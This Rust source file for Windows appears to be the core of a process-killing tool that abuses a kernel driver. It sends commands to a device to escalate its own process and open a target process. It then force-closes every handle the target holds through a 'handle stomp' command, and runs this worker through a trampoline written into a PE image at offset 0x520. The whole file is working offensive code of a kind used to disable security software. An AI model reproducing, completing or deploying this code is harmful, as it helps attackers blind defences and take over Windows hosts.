use std::ffi::c_void;
use std::sync::atomic::{AtomicI32, Ordering};

use windows::Win32::Foundation::CloseHandle;
use windows::Win32::System::Threading::{
    CreateThread, WaitForSingleObject,
    INFINITE, THREAD_CREATE_RUN_IMMEDIATELY,
};

use crate::proto::{Handle, ARG_OFF, CMD_HANDLE_STOMP, make_wbcc, send_cmd};
use crate::session::{escalate, open_proc, enum_handles};
use crate::wbmf::{install_trampoline, set_page_rx};

pub static KILL_STATUS: AtomicI32 = AtomicI32::new(i32::MIN);

#[repr(C)]
pub struct KillArgs { pub dev: Handle, pub pe_base: u64, pub our_pid: u32, pub target_pid: u32 }
unsafe impl Send for KillArgs {}
unsafe impl Sync for KillArgs {}
pub static mut G_KILL: KillArgs = KillArgs { dev: 0, pe_base: 0, our_pid: 0, target_pid: 0 };

unsafe extern "system" fn kill_worker(_: *mut c_void) -> u32 {
    let a    = &G_KILL;
    let wbcc = make_wbcc(a.pe_base);

    if !escalate(a.dev, &wbcc, a.our_pid) {
        KILL_STATUS.store(-1, Ordering::SeqCst);
        return 1;
    }

    let proc_handle = match open_proc(a.dev, &wbcc, a.target_pid) {
        Ok(h)  => h,
        Err(e) => { KILL_STATUS.store(e, Ordering::SeqCst); return 1; }
    };

    let handles = match enum_handles(a.dev, &wbcc, proc_handle) {
        Ok(h)  => h,
        Err(e) => { eprintln!("[-] cmd 791: {e}"); KILL_STATUS.store(-1, Ordering::SeqCst); return 1; }
    };
    println!("[+] cmd 791  {} handles in target", handles.len());

    let mut sent = 0u32; let mut ok = 0u32;
    for &hval in &handles {
        let (st, _) = send_cmd(a.dev, CMD_HANDLE_STOMP, &wbcc, |req| {
            req[ARG_OFF..ARG_OFF+8].copy_from_slice(&proc_handle.to_le_bytes());
            req[ARG_OFF+8..ARG_OFF+16].copy_from_slice(&hval.to_le_bytes());
        });
        sent += 1;
        if st == 0 { ok += 1; }
    }
    println!("[+] cmd 800  {sent} sent  {ok} closed");
    KILL_STATUS.store(0, Ordering::SeqCst);
    0
}

pub fn run_kill(dev: Handle, pe_ptr: *mut u8, soi: usize, our_pid: u32, target_pid: u32) -> i32 {
    let pe_base = pe_ptr as u64;
    unsafe { G_KILL = KillArgs { dev, pe_base, our_pid, target_pid }; }
    install_trampoline(pe_ptr, 0x520, kill_worker as u64);
    println!("[+] trampoline  {:#x} -> kill_worker", pe_base + 0x520);
    unsafe { set_page_rx(pe_ptr, soi); }

    let entry: windows::Win32::System::Threading::LPTHREAD_START_ROUTINE =
        unsafe { std::mem::transmute((pe_base + 0x520) as usize) };
    let th = unsafe {
        CreateThread(None, 0, entry, None, THREAD_CREATE_RUN_IMMEDIATELY, None)
            .expect("CreateThread(kill_worker)")
    };
    unsafe { WaitForSingleObject(th, INFINITE); let _ = CloseHandle(th); }
    KILL_STATUS.load(Ordering::SeqCst)
}
